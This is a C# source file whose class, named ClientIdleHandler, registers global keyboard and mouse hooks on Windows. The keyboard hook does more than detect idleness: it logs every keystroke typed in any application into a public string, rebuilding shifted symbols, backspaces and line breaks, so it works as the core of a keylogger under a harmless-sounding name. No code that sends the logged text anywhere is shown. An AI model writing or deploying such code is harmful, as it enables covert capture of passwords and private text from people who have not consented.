using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace WpfApplication69
{
    public class ClientIdleHandler : IDisposable
    {
        public bool IsActive { get; set; }
        public bool IsClick { get; set; }

        int _hHookKbd;
        public string pamcenje = "";
        int _hHookMouse;

        bool shift = false;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        public delegate int HookProc(int nCode, IntPtr wParam, IntPtr lParam);
        public event HookProc MouseHookProcedure;
        public event HookProc KbdHookProcedure;

        //Use this function to install thread-specific hook.
        [DllImport("user32.dll", CharSet = CharSet.Auto,
             CallingConvention = CallingConvention.StdCall)]
        public static extern int SetWindowsHookEx(int idHook, HookProc lpfn,
            IntPtr hInstance, int threadId);

        //Call this function to uninstall the hook.
        [DllImport("user32.dll", CharSet = CharSet.Auto,
             CallingConvention = CallingConvention.StdCall)]
        public static extern bool UnhookWindowsHookEx(int idHook);

        //Use this function to pass the hook information to next hook procedure in chain.
        [DllImport("user32.dll", CharSet = CharSet.Auto,
             CallingConvention = CallingConvention.StdCall)]
        public static extern int CallNextHookEx(int idHook, int nCode,
            IntPtr wParam, IntPtr lParam);

        //Use this hook to get the module handle, needed for WPF environment
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);


        [DllImport("user32.dll")]
        static extern int MapVirtualKey(int uCode, int uMapType);

        public enum HookType : int
        {
            GlobalKeyboard = 13,
            GlobalMouse = 14
        }

        public int MouseHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //user is active, at least with the mouse
            IsActive = true;
            if (wParam.ToString() == "513")
                IsClick = true;
            else
                IsClick = false;
            //Console.WriteLine("desava se" + wParam.ToString() +"  i  " +lParam.ToString());
            Debug.Print("Mouse active");

            //just return the next hook
            return CallNextHookEx(_hHookMouse, nCode, wParam, lParam);
        }

        public int KbdHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //user is active, at least with the keyboard
            IsActive = true;
           
            Debug.Print("Keyboard active");
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
             
                //KeysConverter kc = new KeysConverter();
                //string keyChar = kc.ConvertToString(((Keys)vkCode));
            

               

                

                Console.WriteLine(((Keys)vkCode).ToString());


                if (((Keys)vkCode).ToString() == "Space")
                {
                    pamcenje += (" ");
                }
                else if (((Keys)vkCode).ToString() == "Back")
                {
                   // Console.WriteLine("vrijedi1");
                    if (pamcenje.Length > 0)
                    {
                        string pomocni = pamcenje.Substring(0, pamcenje.Length - 1);
                        pamcenje = pomocni;
                    }
                }
                else if (((Keys)vkCode).ToString() == "Return")
                {
                   // Console.WriteLine("vrijedi2");
                    pamcenje += ("\n");
                }
                else if (((Keys)vkCode).ToString() == "Left" ||((Keys)vkCode).ToString() == "Right" ||((Keys)vkCode).ToString() == "Up" ||((Keys)vkCode).ToString() == "Down"  )
                {
                    // Console.WriteLine("vrijedi2");
                    pamcenje += ((Keys)vkCode).ToString();
                }
                else if (((Keys)vkCode).ToString() == "Enter")
                {
                    // Console.WriteLine("vrijedi2");
                    pamcenje += ("\n");
                }
                else if (((Keys)vkCode).ToString() == "Oemtilde")
                {
                    pamcenje += ("¸");
                }
                else if (((Keys)vkCode).ToString() == "Tab")
                {
                    pamcenje += ("\t");
                }
                 else if (((Keys)vkCode).ToString() == "LControlKey")
                {
                    pamcenje += ((Keys)vkCode).ToString();
                 }
                else if (((Keys)vkCode).ToString() == "RControlKey")
                {
                    pamcenje += ((Keys)vkCode).ToString();
                }
                else if (((Keys)vkCode).ToString() != "Capital" && ((Keys)vkCode).ToString() != "RShiftKey" && ((Keys)vkCode).ToString() != "LShiftKey")
                {
                    if (shift == false)
                    {
                        int nonVirtualKey = MapVirtualKey(vkCode, 2);
                        if (nonVirtualKey > 64 && nonVirtualKey < 91)
                            nonVirtualKey += 32;

                        char mappedChar = Convert.ToChar(nonVirtualKey);

                        pamcenje += mappedChar.ToString();
                    }
                    else
                    {
                        int nonVirtualKey = MapVirtualKey(vkCode, 2);
                        char mappedChar = Convert.ToChar(nonVirtualKey);


                        switch (((Keys)vkCode).ToString())
                        {
                            case "D1":
                                pamcenje += "!";
                                break;
                            case "D2":
                                pamcenje += "\"";
                                break;
                            case "D3":
                                pamcenje += "#";
                                break;
                            case "D4":
                                pamcenje += "$";
                                break;
                            case "D5":
                                pamcenje += "%";
                                break;
                            case "D6":
                                pamcenje += "&";
                                break;
                            case "D7":
                                pamcenje += "/";
                                break;
                            case "D8":
                                pamcenje += "(";
                                break;
                            case "D9":
                                pamcenje += ")";
                                break;
                            case "D0":
                                pamcenje += "=";
                                break;
                            case "OemQuestion":
                                pamcenje += "?";
                                break;
                            case "Oemplus":
                                pamcenje += "*";
                                break;
                            case "Oemcomma":
                                pamcenje += ";";
                                break;
                            case "OemPeriod":
                                pamcenje += ":";
                                break;
                            case "OemMinus":
                                pamcenje += "_";
                                break;
                            case "OemBackslash":
                                pamcenje += ">";
                                break;

                            default:
                                pamcenje += mappedChar.ToString();
                                break;

                        }
                    }


                }

                if (((Keys)vkCode).ToString() == "LShiftKey" || ((Keys)vkCode).ToString() == "RShiftKey")
                {
                    shift = true;
                }
               


            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "LShiftKey" || ((Keys)vkCode).ToString() == "RShiftKey")
                {
                    shift = false;
                }
            }

           // Console.WriteLine("param= "+nCode.ToString()+"  i  " + wParam.ToString() +" i "+ lParam.ToString());
            //just return the next hook
            return CallNextHookEx(_hHookKbd, nCode, wParam, lParam);
        }

        public void Start()
        {
            using (var currentProcess = Process.GetCurrentProcess())
            using (var mainModule = currentProcess.MainModule)
            {

                if (_hHookMouse == 0)
                {
                    // Create an instance of HookProc.
                    MouseHookProcedure = new HookProc(MouseHookProc);
                    // Create an instance of HookProc.
                    KbdHookProcedure = new HookProc(KbdHookProc);

                    //register a global hook
                    _hHookMouse = SetWindowsHookEx((int)HookType.GlobalMouse,
                                                  MouseHookProcedure,
                                                  GetModuleHandle(mainModule.ModuleName),
                                                  0);
                    if (_hHookMouse == 0)
                    {
                        Close();
                        throw new ApplicationException("SetWindowsHookEx() failed for the mouse");
                    }
                }

                if (_hHookKbd == 0)
                {
                    //register a global hook
                    _hHookKbd = SetWindowsHookEx((int)HookType.GlobalKeyboard,
                                                KbdHookProcedure,
                                                GetModuleHandle(mainModule.ModuleName),
                                                0);
                    if (_hHookKbd == 0)
                    {
                        Close();
                        throw new ApplicationException("SetWindowsHookEx() failed for the keyboard");
                    }
                }
            }
        }

        public void Close()
        {
            if (_hHookMouse != 0)
            {
                bool ret = UnhookWindowsHookEx(_hHookMouse);
                if (ret == false)
                {
                    throw new ApplicationException("UnhookWindowsHookEx() failed for the mouse");
                }
                _hHookMouse = 0;
            }

            if (_hHookKbd != 0)
            {
                bool ret = UnhookWindowsHookEx(_hHookKbd);
                if (ret == false)
                {
                    throw new ApplicationException("UnhookWindowsHookEx() failed for the keyboard");
                }
                _hHookKbd = 0;
            }
        }

        #region IDisposable Members

        public void Dispose()
        {
            if (_hHookMouse != 0 || _hHookKbd != 0)
                Close();
        }

        #endregion
    }
}
